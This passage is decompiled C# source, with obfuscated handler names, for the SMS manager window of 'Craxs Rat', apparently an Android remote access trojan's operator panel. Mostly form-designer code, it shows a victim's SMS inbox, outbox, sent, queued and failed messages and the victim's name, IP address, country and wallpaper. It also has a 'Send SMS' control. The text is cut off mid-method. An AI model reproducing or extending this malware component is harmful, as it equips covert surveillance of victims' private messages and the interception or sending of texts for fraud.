using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using Craxs_Rat.sockets;
using DrakeUI.Framework;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace Craxs_Rat;

[DesignerGenerated]
public class SMSManager : Form
{
	private IContainer components;

	[AccessedThroughProperty("DGV0")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private DataGridView _DGV0;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("AllToolStripMenuItem")]
	private ToolStripMenuItem _AllToolStripMenuItem;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("OutboxToolStripMenuItem")]
	private ToolStripMenuItem _OutboxToolStripMenuItem;

	[AccessedThroughProperty("InboxToolStripMenuItem")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private ToolStripMenuItem _InboxToolStripMenuItem;

	[AccessedThroughProperty("SentToolStripMenuItem")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private ToolStripMenuItem _SentToolStripMenuItem;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("QueuedToolStripMenuItem")]
	private ToolStripMenuItem _QueuedToolStripMenuItem;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("FailedToolStripMenuItem")]
	private ToolStripMenuItem _FailedToolStripMenuItem;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	[AccessedThroughProperty("SaveToolStripMenuItem")]
	private ToolStripMenuItem _SaveToolStripMenuItem;

	[AccessedThroughProperty("SaveAsToolStripMenuItem")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private ToolStripMenuItem _SaveAsToolStripMenuItem;

	[CompilerGenerated]
	[AccessedThroughProperty("TOpacity")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private System.Windows.Forms.Timer _TOpacity;

	[AccessedThroughProperty("BoxTitle")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private PictureBox _BoxTitle;

	[AccessedThroughProperty("DrakeUIAvatar1")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private DrakeUIAvatar _DrakeUIAvatar1;

	public TcpClient Client;

	public Client classClient;

	public string Title;

	public string tmpFolderUSER;

	public string tmpClientName;

	public string tmpCountry;

	public string tmpAddressIP;

	private bool BoxTitlePaintEventArgsWait;

	internal virtual DataGridView DGV0
	{
		[CompilerGenerated]
		get
		{
			return _DGV0;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			DataGridViewCellEventHandler value2 = DGV0_CellContentClick;
			DataGridViewCellEventHandler value3 = DGV0_CellClick;
			DataGridViewCellEventHandler value4 = DGV0_RowEnter;
			DataGridViewRowsRemovedEventHandler value5 = DGV0_RowsRemoved;
			DataGridViewRowsAddedEventHandler value6 = DGV0_RowsAdded;
			EventHandler value7 = DGV0_SelectionChanged;
			DataGridView dataGridView = _DGV0;
			if (dataGridView != null)
			{
				dataGridView.CellContentClick -= value2;
				dataGridView.CellClick -= value3;
				dataGridView.RowEnter -= value4;
				dataGridView.RowsRemoved -= value5;
				dataGridView.RowsAdded -= value6;
				dataGridView.SelectionChanged -= value7;
			}
			_DGV0 = value;
			dataGridView = _DGV0;
			if (dataGridView != null)
			{
				dataGridView.CellContentClick += value2;
				dataGridView.CellClick += value3;
				dataGridView.RowEnter += value4;
				dataGridView.RowsRemoved += value5;
				dataGridView.RowsAdded += value6;
				dataGridView.SelectionChanged += value7;
			}
		}
	}

	[field: AccessedThroughProperty("ctx")]
	internal virtual ContextMenuStrip ctx
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("PathsToolStripMenuItem")]
	internal virtual ToolStripMenuItem PathsToolStripMenuItem
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual ToolStripMenuItem AllToolStripMenuItem
	{
		[CompilerGenerated]
		get
		{
			return _AllToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = AllToolStripMenuItem_Click;
			ToolStripMenuItem toolStripMenuItem = _AllToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_AllToolStripMenuItem = value;
			toolStripMenuItem = _AllToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem OutboxToolStripMenuItem
	{
		[CompilerGenerated]
		get
		{
			return _OutboxToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = OutboxToolStripMenuItem_Click;
			ToolStripMenuItem toolStripMenuItem = _OutboxToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_OutboxToolStripMenuItem = value;
			toolStripMenuItem = _OutboxToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem InboxToolStripMenuItem
	{
		[CompilerGenerated]
		get
		{
			return _InboxToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = InboxToolStripMenuItem_Click;
			ToolStripMenuItem toolStripMenuItem = _InboxToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_InboxToolStripMenuItem = value;
			toolStripMenuItem = _InboxToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem SentToolStripMenuItem
	{
		[CompilerGenerated]
		get
		{
			return _SentToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = SentToolStripMenuItem_Click;
			ToolStripMenuItem toolStripMenuItem = _SentToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_SentToolStripMenuItem = value;
			toolStripMenuItem = _SentToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem QueuedToolStripMenuItem
	{
		[CompilerGenerated]
		get
		{
			return _QueuedToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = QueuedToolStripMenuItem_Click;
			ToolStripMenuItem toolStripMenuItem = _QueuedToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_QueuedToolStripMenuItem = value;
			toolStripMenuItem = _QueuedToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem FailedToolStripMenuItem
	{
		[CompilerGenerated]
		get
		{
			return _FailedToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = FailedToolStripMenuItem_Click;
			ToolStripMenuItem toolStripMenuItem = _FailedToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_FailedToolStripMenuItem = value;
			toolStripMenuItem = _FailedToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem SaveToolStripMenuItem
	{
		[CompilerGenerated]
		get
		{
			return _SaveToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = CraxsRatkfvuiorkenfudpajrsnCraxsRatszxcytrqa;
			ToolStripMenuItem toolStripMenuItem = _SaveToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_SaveToolStripMenuItem = value;
			toolStripMenuItem = _SaveToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem SaveAsToolStripMenuItem
	{
		[CompilerGenerated]
		get
		{
			return _SaveAsToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = CraxsRatkfvuiorkenfudpajrsnCraxsRatsjufrswas;
			ToolStripMenuItem toolStripMenuItem = _SaveAsToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_SaveAsToolStripMenuItem = value;
			toolStripMenuItem = _SaveAsToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual System.Windows.Forms.Timer TOpacity
	{
		[CompilerGenerated]
		get
		{
			return _TOpacity;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = TOpacity_Tick;
			System.Windows.Forms.Timer timer = _TOpacity;
			if (timer != null)
			{
				timer.Tick -= value2;
			}
			_TOpacity = value;
			timer = _TOpacity;
			if (timer != null)
			{
				timer.Tick += value2;
			}
		}
	}

	[field: AccessedThroughProperty("PB")]
	internal virtual ProgressBar PB
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual PictureBox BoxTitle
	{
		[CompilerGenerated]
		get
		{
			return _BoxTitle;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			PaintEventHandler value2 = BoxTitle_Paint;
			EventHandler value3 = BoxTitle_Resize;
			PictureBox pictureBox = _BoxTitle;
			if (pictureBox != null)
			{
				pictureBox.Paint -= value2;
				pictureBox.Resize -= value3;
			}
			_BoxTitle = value;
			pictureBox = _BoxTitle;
			if (pictureBox != null)
			{
				pictureBox.Paint += value2;
				pictureBox.Resize += value3;
			}
		}
	}

	[field: AccessedThroughProperty("Column1")]
	internal virtual DataGridViewTextBoxColumn Column1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Column6")]
	internal virtual DataGridViewTextBoxColumn Column6
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Column9")]
	internal virtual DataGridViewTextBoxColumn Column9
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Column7")]
	internal virtual DataGridViewTextBoxColumn Column7
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Column2")]
	internal virtual DataGridViewTextBoxColumn Column2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Column3")]
	internal virtual DataGridViewImageColumn Column3
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUIAvatar DrakeUIAvatar1
	{
		[CompilerGenerated]
		get
		{
			return _DrakeUIAvatar1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = CraxsRatkfvuiorkenfudpajrsnCraxsRatsqwsakartx;
			DrakeUIAvatar drakeUIAvatar = _DrakeUIAvatar1;
			if (drakeUIAvatar != null)
			{
				drakeUIAvatar.Click -= value2;
			}
			_DrakeUIAvatar1 = value;
			drakeUIAvatar = _DrakeUIAvatar1;
			if (drakeUIAvatar != null)
			{
				drakeUIAvatar.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("DrakeUIToolTip1")]
	internal virtual DrakeUIToolTip DrakeUIToolTip1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Panel2")]
	internal virtual Panel Panel2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("clinameinfo")]
	internal virtual Label clinameinfo
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("ClientPic")]
	internal virtual PictureBox ClientPic
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Panel1")]
	internal virtual Panel Panel1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("showtext")]
	internal virtual TextBox showtext
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	public SMSManager()
	{
		base.Load += CraxsRatkfvuiorkenfudpajrsnCraxsRatsqazfghs;
		base.Closing += SMSManager_Closing;
		base.Activated += AngelAndroidForm_Activated;
		base.Deactivate += AngelAndroidForm_Deactivate;
		Title = "null";
		BoxTitlePaintEventArgsWait = false;
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			base.Dispose(disposing);
		}
	}

	[System.Diagnostics.DebuggerStepThrough]
	private void InitializeComponent()
	{
		this.components = new System.ComponentModel.Container();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle2 = new System.Windows.Forms.DataGridViewCellStyle();
		this.DGV0 = new System.Windows.Forms.DataGridView();
		this.Column1 = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.Column6 = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.Column9 = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.Column7 = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.Column2 = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.Column3 = new System.Windows.Forms.DataGridViewImageColumn();
		this.ctx = new System.Windows.Forms.ContextMenuStrip(this.components);
		this.PathsToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.AllToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.OutboxToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.InboxToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.SentToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.QueuedToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.FailedToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.SaveToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.SaveAsToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.TOpacity = new System.Windows.Forms.Timer(this.components);
		this.PB = new System.Windows.Forms.ProgressBar();
		this.BoxTitle = new System.Windows.Forms.PictureBox();
		this.DrakeUIAvatar1 = new DrakeUI.Framework.DrakeUIAvatar();
		this.DrakeUIToolTip1 = new DrakeUI.Framework.DrakeUIToolTip(this.components);
		this.Panel2 = new System.Windows.Forms.Panel();
		this.clinameinfo = new System.Windows.Forms.Label();
		this.ClientPic = new System.Windows.Forms.PictureBox();
		this.Panel1 = new System.Windows.Forms.Panel();
		this.showtext = new System.Windows.Forms.TextBox();
		((System.ComponentModel.ISupportInitialize)this.DGV0).BeginInit();
		this.ctx.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.BoxTitle).BeginInit();
		this.Panel2.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.ClientPic).BeginInit();
		this.Panel1.SuspendLayout();
		base.SuspendLayout();
		this.DGV0.AllowUserToAddRows = false;
		this.DGV0.AllowUserToDeleteRows = false;
		this.DGV0.AllowUserToResizeColumns = false;
		this.DGV0.AllowUserToResizeRows = false;
		this.DGV0.AutoSizeColumnsMode = System.Windows.Forms.DataGridViewAutoSizeColumnsMode.AllCells;
		this.DGV0.AutoSizeRowsMode = System.Windows.Forms.DataGridViewAutoSizeRowsMode.AllCells;
		this.DGV0.BackgroundColor = System.Drawing.Color.Black;
		this.DGV0.BorderStyle = System.Windows.Forms.BorderStyle.None;
		this.DGV0.CellBorderStyle = System.Windows.Forms.DataGridViewCellBorderStyle.None;
		this.DGV0.ColumnHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.None;
		dataGridViewCellStyle.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
		dataGridViewCellStyle.BackColor = System.Drawing.Color.Black;
		dataGridViewCellStyle.Font = new System.Drawing.Font("Calibri", 8.25f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
		dataGridViewCellStyle.ForeColor = System.Drawing.Color.SkyBlue;
		dataGridViewCellStyle.SelectionBackColor = System.Drawing.SystemColors.Highlight;
		dataGridViewCellStyle.SelectionForeColor = System.Drawing.SystemColors.HighlightText;
		dataGridViewCellStyle.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
		this.DGV0.ColumnHeadersDefaultCellStyle = dataGridViewCellStyle;
		this.DGV0.ColumnHeadersHeightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.AutoSize;
		this.DGV0.Columns.AddRange(this.Column1, this.Column6, this.Column9, this.Column7, this.Column2, this.Column3);
		this.DGV0.ContextMenuStrip = this.ctx;
		dataGridViewCellStyle2.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
		dataGridViewCellStyle2.BackColor = System.Drawing.Color.Black;
		dataGridViewCellStyle2.Font = new System.Drawing.Font("Calibri", 8.25f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
		dataGridViewCellStyle2.ForeColor = System.Drawing.Color.SkyBlue;
		dataGridViewCellStyle2.SelectionBackColor = System.Drawing.Color.FromArgb(190, 190, 190);
		dataGridViewCellStyle2.SelectionForeColor = System.Drawing.Color.Black;
		dataGridViewCellStyle2.WrapMode = System.Windows.Forms.DataGridViewTriState.False;
		this.DGV0.DefaultCellStyle = dataGridViewCellStyle2;
		this.DGV0.Dock = System.Windows.Forms.DockStyle.Fill;
		this.DGV0.EditMode = System.Windows.Forms.DataGridViewEditMode.EditProgrammatically;
		this.DGV0.EnableHeadersVisualStyles = false;
		this.DGV0.GridColor = System.Drawing.Color.SkyBlue;
		this.DGV0.Location = new System.Drawing.Point(0, 39);
		this.DGV0.Margin = new System.Windows.Forms.Padding(4);
		this.DGV0.Name = "DGV0";
		this.DGV0.RowHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.Single;
		this.DGV0.RowHeadersVisible = false;
		this.DGV0.SelectionMode = System.Windows.Forms.DataGridViewSelectionMode.FullRowSelect;
		this.DGV0.Size = new System.Drawing.Size(586, 471);
		this.DGV0.TabIndex = 3;
		this.Column1.HeaderText = "address";
		this.Column1.Name = "Column1";
		this.Column1.Width = 82;
		this.Column6.HeaderText = "name";
		this.Column6.Name = "Column6";
		this.Column6.Width = 68;
		this.Column9.HeaderText = "date";
		this.Column9.Name = "Column9";
		this.Column9.Width = 62;
		this.Column7.HeaderText = "part";
		this.Column7.Name = "Column7";
		this.Column7.Width = 60;
		this.Column2.HeaderText = "path";
		this.Column2.Name = "Column2";
		this.Column2.Width = 63;
		this.Column3.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.None;
		this.Column3.FillWeight = 1f;
		this.Column3.HeaderText = "";
		this.Column3.MinimumWidth = 2;
		this.Column3.Name = "Column3";
		this.Column3.SortMode = System.Windows.Forms.DataGridViewColumnSortMode.Programmatic;
		this.Column3.Width = 2;
		this.ctx.ImageScalingSize = new System.Drawing.Size(20, 20);
		this.ctx.Items.AddRange(new System.Windows.Forms.ToolStripItem[3] { this.PathsToolStripMenuItem, this.SaveToolStripMenuItem, this.SaveAsToolStripMenuItem });
		this.ctx.Name = "ContextMenuStrip1";
		this.ctx.ShowImageMargin = false;
		this.ctx.Size = new System.Drawing.Size(105, 76);
		this.PathsToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[6] { this.AllToolStripMenuItem, this.OutboxToolStripMenuItem, this.InboxToolStripMenuItem, this.SentToolStripMenuItem, this.QueuedToolStripMenuItem, this.FailedToolStripMenuItem });
		this.PathsToolStripMenuItem.Name = "PathsToolStripMenuItem";
		this.PathsToolStripMenuItem.Size = new System.Drawing.Size(104, 24);
		this.PathsToolStripMenuItem.Text = "Paths";
		this.AllToolStripMenuItem.Name = "AllToolStripMenuItem";
		this.AllToolStripMenuItem.Size = new System.Drawing.Size(134, 26);
		this.AllToolStripMenuItem.Text = "all";
		this.OutboxToolStripMenuItem.Name = "OutboxToolStripMenuItem";
		this.OutboxToolStripMenuItem.Size = new System.Drawing.Size(134, 26);
		this.OutboxToolStripMenuItem.Text = "outbox";
		this.InboxToolStripMenuItem.Name = "InboxToolStripMenuItem";
		this.InboxToolStripMenuItem.Size = new System.Drawing.Size(134, 26);
		this.InboxToolStripMenuItem.Text = "inbox";
		this.SentToolStripMenuItem.Name = "SentToolStripMenuItem";
		this.SentToolStripMenuItem.Size = new System.Drawing.Size(134, 26);
		this.SentToolStripMenuItem.Text = "sent";
		this.QueuedToolStripMenuItem.Name = "QueuedToolStripMenuItem";
		this.QueuedToolStripMenuItem.Size = new System.Drawing.Size(134, 26);
		this.QueuedToolStripMenuItem.Text = "queued";
		this.FailedToolStripMenuItem.Name = "FailedToolStripMenuItem";
		this.FailedToolStripMenuItem.Size = new System.Drawing.Size(134, 26);
		this.FailedToolStripMenuItem.Text = "failed";
		this.SaveToolStripMenuItem.Name = "SaveToolStripMenuItem";
		this.SaveToolStripMenuItem.Size = new System.Drawing.Size(104, 24);
		this.SaveToolStripMenuItem.Text = "Save";
		this.SaveToolStripMenuItem.Visible = false;
		this.SaveAsToolStripMenuItem.Name = "SaveAsToolStripMenuItem";
		this.SaveAsToolStripMenuItem.Size = new System.Drawing.Size(104, 24);
		this.SaveAsToolStripMenuItem.Text = "Save As";
		this.SaveAsToolStripMenuItem.Visible = false;
		this.TOpacity.Interval = 1;
		this.PB.Dock = System.Windows.Forms.DockStyle.Bottom;
		this.PB.Location = new System.Drawing.Point(0, 510);
		this.PB.Margin = new System.Windows.Forms.Padding(4);
		this.PB.Name = "PB";
		this.PB.Size = new System.Drawing.Size(586, 12);
		this.PB.TabIndex = 6;
		this.BoxTitle.BackColor = System.Drawing.Color.Black;
		this.BoxTitle.Dock = System.Windows.Forms.DockStyle.Bottom;
		this.BoxTitle.ErrorImage = null;
		this.BoxTitle.InitialImage = null;
		this.BoxTitle.Location = new System.Drawing.Point(0, 522);
		this.BoxTitle.Margin = new System.Windows.Forms.Padding(4);
		this.BoxTitle.Name = "BoxTitle";
		this.BoxTitle.Size = new System.Drawing.Size(586, 22);
		this.BoxTitle.TabIndex = 7;
		this.BoxTitle.TabStop = false;
		this.DrakeUIAvatar1.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right;
		this.DrakeUIAvatar1.BackColor = System.Drawing.Color.Transparent;
		this.DrakeUIAvatar1.Cursor = System.Windows.Forms.Cursors.Hand;
		this.DrakeUIAvatar1.FillColor = System.Drawing.Color.Black;
		this.DrakeUIAvatar1.Font = new System.Drawing.Font("Calibri", 12f);
		this.DrakeUIAvatar1.ForeColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIAvatar1.Location = new System.Drawing.Point(524, 457);
		this.DrakeUIAvatar1.Name = "DrakeUIAvatar1";
		this.DrakeUIAvatar1.Size = new System.Drawing.Size(56, 46);
		this.DrakeUIAvatar1.Style = DrakeUI.Framework.UIStyle.Custom;
		this.DrakeUIAvatar1.Symbol = 61579;
		this.DrakeUIAvatar1.TabIndex = 9;
		this.DrakeUIAvatar1.Text = "DrakeUIAvatar1";
		this.DrakeUIToolTip1.SetToolTip(this.DrakeUIAvatar1, "Send SMS");
		this.DrakeUIToolTip1.BackColor = System.Drawing.Color.FromArgb(54, 54, 54);
		this.DrakeUIToolTip1.ForeColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIToolTip1.OwnerDraw = true;
		this.Panel2.BackColor = System.Drawing.Color.Black;
		this.Panel2.Controls.Add(this.clinameinfo);
		this.Panel2.Controls.Add(this.ClientPic);
		this.Panel2.Dock = System.Windows.Forms.DockStyle.Top;
		this.Panel2.ForeColor = System.Drawing.Color.SkyBlue;
		this.Panel2.Location = new System.Drawing.Point(0, 0);
		this.Panel2.Name = "Panel2";
		this.Panel2.Size = new System.Drawing.Size(586, 39);
		this.Panel2.TabIndex = 10;
		this.clinameinfo.BackColor = System.Drawing.Color.Transparent;
		this.clinameinfo.Dock = System.Windows.Forms.DockStyle.Fill;
		this.clinameinfo.Font = new System.Drawing.Font("Calibri", 9f);
		this.clinameinfo.ForeColor = System.Drawing.Color.SkyBlue;
		this.clinameinfo.Location = new System.Drawing.Point(42, 0);
		this.clinameinfo.Name = "clinameinfo";
		this.clinameinfo.Size = new System.Drawing.Size(544, 39);
		this.clinameinfo.TabIndex = 12;
		this.clinameinfo.Text = "...";
		this.clinameinfo.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
		this.ClientPic.Dock = System.Windows.Forms.DockStyle.Left;
		this.ClientPic.Location = new System.Drawing.Point(0, 0);
		this.ClientPic.Margin = new System.Windows.Forms.Padding(3, 4, 3, 4);
		this.ClientPic.Name = "ClientPic";
		this.ClientPic.Size = new System.Drawing.Size(42, 39);
		this.ClientPic.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
		this.ClientPic.TabIndex = 11;
		this.ClientPic.TabStop = false;
		this.Panel1.BackColor = System.Drawing.Color.Black;
		this.Panel1.Controls.Add(this.showtext);
		this.Panel1.Dock = System.Windows.Forms.DockStyle.Right;
		this.Panel1.Font = new System.Drawing.Font("Calibri", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.Panel1.ForeColor = System.Drawing.Color.SkyBlue;
		this.Panel1.Location = new System.Drawing.Point(586, 0);
		this.Panel1.Name = "Panel1";
		this.Panel1.Size = new System.Drawing.Size(383, 544);
		this.Panel1.TabIndex = 11;
		this.showtext.BackColor = System.Drawing.Color.Black;
		this.showtext.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
		this.showtext.Dock = System.Windows.Forms.DockStyle.Fill;
		this.showtext.ForeColor = System.Drawing.Color.SkyBlue;
		this.showtext.Location = new System.Drawing.Point(0, 0);
		this.showtext.Multiline = true;
		this.showtext.Name = "showtext";
		this.showtext.Size = new System.Drawing.Size(383, 544);
		this.showtext.TabIndex = 0;
		base.AutoScaleDimensions = new System.Drawing.SizeF(8f, 16f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		this.BackColor = System.Drawing.Color.Black;
		base.ClientSize = new System.Drawing.Size(969, 544);
		base.Controls.Add(this.DrakeUIAvatar1);
		base.Controls.Add(this.DGV0);
		base.Controls.Add(this.PB);
		base.Controls.Add(this.BoxTitle);
		base.Controls.Add(this.Panel2);
		base.Controls.Add(this.Panel1);
		base.Margin = new System.Windows.Forms.Padding(4);
		base.Name = "SMSManager";
		base.Opacity = 0.0;
		base.ShowIcon = false;
		this.Text = "SMSManager";
		((System.ComponentModel.ISupportInitialize)this.DGV0).EndInit();
		this.ctx.ResumeLayout(false);
		((System.ComponentModel.ISupportInitialize)this.BoxTitle).EndInit();
		this.Panel2.ResumeLayout(false);
		((System.ComponentModel.ISupportInitialize)this.ClientPic).EndInit();
		this.Panel1.ResumeLayout(false);
		this.Panel1.PerformLayout();
		base.ResumeLayout(false);
	}

	private void TOpacity_Tick(object sender, EventArgs e)
	{
		if (base.Opacity != 1.0)
		{
			base.Opacity += 0.1;
		}
		else
		{
			TOpacity.Enabled = false;
		}
	}

	private void CraxsRatkfvuiorkenfudpajrsnCraxsRatsqazfghs(object sender, EventArgs e)
	{
		base.Icon = new Icon(reso.res_Path + "\\Icons\\win\\14.ico");
		try
		{
			ClientPic.Image = classClient.Wallpaper;
			clinameinfo.Text = "Name: " + classClient.ClientName + Strings.Space(2) + "IP: " + classClient.ClientAddressIP + Strings.Space(2) + "Country: " + classClient.Country;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		((ToolStripDropDownMenu)PathsToolStripMenuItem.DropDown).ShowImageMargin = false;
		((ToolStripDropDownMenu)PathsToolStripMenuItem.DropDown).BackColor = ctx.BackColor;
		DGV0.ColumnHeadersDefaultCellStyle.Font = reso.f;
		DGV0.DefaultCellStyle.Font = reso.f;
		if (Operators.CompareString(SpySettings.SAVING_DATA, "No", TextCompare: false) == 0)
		{
			SaveToolStripMenuItem.Visible = true;
			SaveAsToolStripMenuItem.Visible = true;
		}
		Text = Title;
		TOpacity.Interval = SpySettings.T_Interval;
		TOpacity.Enabled = true;
		BoxTitlePaintEventArgsWait = true;
	}

	private void DGV0_CellContentClick(object sender, DataGridViewCellEventArgs e)
	{
	}

	private void DGV0_CellClick(object sender, DataGridViewCellEventArgs e)
	{
		if ((e.RowIndex != -1) & (e.ColumnIndex != -1))
		{
			SelectMessage(e.RowIndex);
		}
	}

	private void DGV0_RowEnter(object sender, DataGridViewCellEventArgs e)
	{
